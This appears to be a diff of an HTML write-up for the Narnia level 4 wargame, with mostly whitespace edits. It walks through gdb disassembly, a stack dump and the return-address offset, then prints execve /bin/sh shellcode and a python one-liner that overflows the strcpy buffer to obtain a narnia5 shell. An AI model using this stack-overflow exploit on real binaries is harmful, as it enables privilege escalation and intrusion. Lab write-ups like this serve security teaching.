 Reading symbols from /games/narnia/narnia4...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
 <span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
 <span class="o">(</span>gdb<span class="o">)</span> disas main
 Dump of assembler code <span class="k">for function </span>main:
-   0x08048444 &lt;+0&gt;: push   ebp
-   0x08048445 &lt;+1&gt;: mov    ebp,esp
-   0x08048447 &lt;+3&gt;: push   edi
-   0x08048448 &lt;+4&gt;: and    esp,0xfffffff0
-   0x0804844b &lt;+7&gt;: sub    esp,0x130
+ 0x08048444 &lt;+0&gt;: push ebp
+ 0x08048445 &lt;+1&gt;: mov ebp,esp
+ 0x08048447 &lt;+3&gt;: push edi
+ 0x08048448 &lt;+4&gt;: and esp,0xfffffff0
+ 0x0804844b &lt;+7&gt;: sub esp,0x130
 <span class="o">(</span>..<span class="o">)</span>
-   0x080484f0 &lt;+172&gt;: call   0x8048350 &lt;strcpy@plt&gt;
-   0x080484f5 &lt;+177&gt;: mov    eax,0x0
-   0x080484fa &lt;+182&gt;: mov    edi,DWORD PTR <span class="o">[</span>ebp-0x4<span class="o">]</span>
-   0x080484fd &lt;+185&gt;: leave
-   0x080484fe &lt;+186&gt;: ret
+ 0x080484f0 &lt;+172&gt;: call 0x8048350 &lt;strcpy@plt&gt;
+ 0x080484f5 &lt;+177&gt;: mov eax,0x0
+ 0x080484fa &lt;+182&gt;: mov edi,DWORD PTR <span class="o">[</span>ebp-0x4<span class="o">]</span>
+ 0x080484fd &lt;+185&gt;: leave
+ 0x080484fe &lt;+186&gt;: ret
 End of assembler dump.
 </pre></div>
 
@@ -854,29 +854,29 @@ Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 <p>We see that the frame starts at <strong>0xffffd4cc</strong>:</p>
 <div class="highlight"><pre><span class="o">(</span>gdb<span class="o">)</span> x/90xw <span class="nv">$esp</span>
-0xffffd4a0: 0xffffd4cc  0xffffd7be  0x00000021  0xf7ff7d54
-0xffffd4b0: 0xf7e2ae38  0x00000000  0x00000026  0xffffffff
-0xffffd4c0: 0x00000000  0x00000000  0x00000001  0x41414141
-0xffffd4d0: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd4e0: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd4f0: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd500: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd510: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd520: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd530: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd540: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd550: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd560: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd570: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd580: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd590: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd5a0: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd5b0: 0x41414141  0x41414141  0x41414141  0x41414141
-0xffffd5c0: 0x41414141  0x41414141  0x41414141  0x00000000
-0xffffd5d0: 0x08048500  0x00000000  0x00000000  0xf7e404b3
-0xffffd5e0: 0x00000002  0xffffd674  0xffffd680  0xf7fcf000
-0xffffd5f0: 0x00000000  0xffffd61c  0xffffd680  0x00000000
-0xffffd600: 0x0804824c  0xf7fcaff4
+0xffffd4a0: 0xffffd4cc 0xffffd7be 0x00000021 0xf7ff7d54
+0xffffd4b0: 0xf7e2ae38 0x00000000 0x00000026 0xffffffff
+0xffffd4c0: 0x00000000 0x00000000 0x00000001 0x41414141
+0xffffd4d0: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd4e0: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd4f0: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd500: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd510: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd520: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd530: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd540: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd550: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd560: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd570: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd580: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd590: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd5a0: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd5b0: 0x41414141 0x41414141 0x41414141 0x41414141
+0xffffd5c0: 0x41414141 0x41414141 0x41414141 0x00000000
+0xffffd5d0: 0x08048500 0x00000000 0x00000000 0xf7e404b3
+0xffffd5e0: 0x00000002 0xffffd674 0xffffd680 0xf7fcf000
+0xffffd5f0: 0x00000000 0xffffd61c 0xffffd680 0x00000000
+0xffffd600: 0x0804824c 0xf7fcaff4
 </pre></div>
 
 
@@ -887,16 +887,16 @@ Stack level 0, frame at 0xffffd5e0:
  Arglist at 0xffffd5d8, args:
  Locals at 0xffffd5d8, Previous frame<span class="err">&#39;</span>s sp is 0xffffd5e0
  Saved registers:
-  ebp at 0xffffd5d8, edi at 0xffffd5d4, eip at 0xffffd5dc
+ ebp at 0xffffd5d8, edi at 0xffffd5d4, eip at 0xffffd5dc
 <span class="o">(</span>gdb<span class="o">)</span> p 0xffffd5dc-0xffffd4cc
 <span class="nv">$1</span> <span class="o">=</span> 272
 </pre></div>
 
 
 <h3>Step 4: Writing and Applying the Exploit</h3>
-<p>We know that the Stack has a size of 272 bytes and that the return address is <strong>0xffffd5dc</strong>.  If we add the return address, it sums to 276.</p>
+<p>We know that the Stack has a size of 272 bytes and that the return address is <strong>0xffffd5dc</strong>. If we add the return address, it sums to 276.</p>
 <p>Now we have some freedom to choose where to place our shellcode. Let's say, we place it somewhere in the middle, say, at the position 134. In the memory, we get: <code>0xffffd5cc - 134 = 0xffffd546</code>.</p>
-<p>Since 276 minus 134 is 142, if we point the return address to   <strong>0xffffd546</strong>, it will go to the 142th position in the Stack and execute whatever is there. We want to make sure that the return address will always end in the shellcode address and for this reason we fill the addresses around with NOPs.</p>
+<p>Since 276 minus 134 is 142, if we point the return address to <strong>0xffffd546</strong>, it will go to the 142th position in the Stack and execute whatever is there. We want to make sure that the return address will always end in the shellcode address and for this reason, we fill the addresses around with NOPs.</p>
 <p>We will borrow the shellcode from the previous levels, which has size of 25 bytes:</p>
 <div class="highlight"><pre><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xc0</span><span class="err">\</span><span class="n">x50</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x73</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x68</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x69</span><span class="err">\</span><span class="n">x6e</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe3</span><span class="err">\</span><span class="n">x50</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe2</span><span class="err">\</span><span class="n">x50</span><span class="err">\</span><span class="n">x89</span><span class="err">\</span><span class="n">xe1</span><span class="err">\</span><span class="n">xb0</span><span class="err">\</span><span class="n">x0b</span><span class="err">\</span><span class="n">xcd</span><span class="err">\</span><span class="n">x80</span>
 </pre></div>
@@ -916,7 +916,7 @@ Stack level 0, frame at 0xffffd5e0:
 <p>We finally apply our exploit:</p>
 <div class="highlight"><pre><span class="n">narnia4</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;print &#39;</span><span class="se">\x90</span><span class="s">&#39;*156 + &#39;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">&#39; + &#39;A&#39;*91 + &#39;</span><span class="se">\x54\xd5\xff\xff</span><span class="s">&#39;&quot;</span>
 <span class="err">������������������������������������������������������������������������������������������������������������������������������������������������������������</span><span class="mi">1</span><span class="err">�</span><span class="n">Ph</span><span class="c1">//shh/bin��P��P���</span>
-              <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT</span><span class="err">���</span>
+ <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT</span><span class="err">���</span>
 <span class="n">narnia4</span><span class="err">@</span><span class="n">melinda</span><span class="o">:/</span><span class="n">tmp</span><span class="err">$</span> <span class="o">/</span><span class="n">narnia</span><span class="o">/</span><span class="n">narnia4</span> <span class="err">`</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&quot;print &#39;</span><span class="se">\x90</span><span class="s">&#39;*156 + &#39;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">&#39; + &#39;A&#39;*91 + &#39;</span><span class="se">\x54\xd5\xff\xff</span><span class="s">&#39;&quot;</span><span class="err">`</span>
 <span class="err">$</span> <span class="n">whoami</span>
 <span class="n">narnia5</span>
